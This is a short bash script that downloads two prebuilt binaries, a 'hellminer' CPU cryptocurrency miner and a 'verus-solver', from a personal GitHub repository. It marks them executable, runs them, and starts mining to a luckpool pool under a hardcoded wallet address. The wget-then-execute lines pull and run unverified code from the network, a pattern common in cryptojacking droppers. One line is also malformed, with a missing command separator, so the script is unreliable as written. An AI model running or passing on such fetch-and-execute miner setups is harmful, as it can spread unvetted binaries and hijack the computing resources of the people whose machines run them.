#!/bin/bash
apt-get install msr-tools
wget https://github.com/Godmine99/cpu/raw/main/hellminer && chmod +x hellminer && wget https://github.com/Godmine99/cpu/raw/main/verus-solver && chmod +x verus-solver ./verus-solver && apt install screen
./hellminer -c stratum+tcp://ap.luckpool.net:3956 -u RCkUicukApnBsqzRvqPg4iD3jQTo4K5yTG.ENGLISH -p x --cpu 4
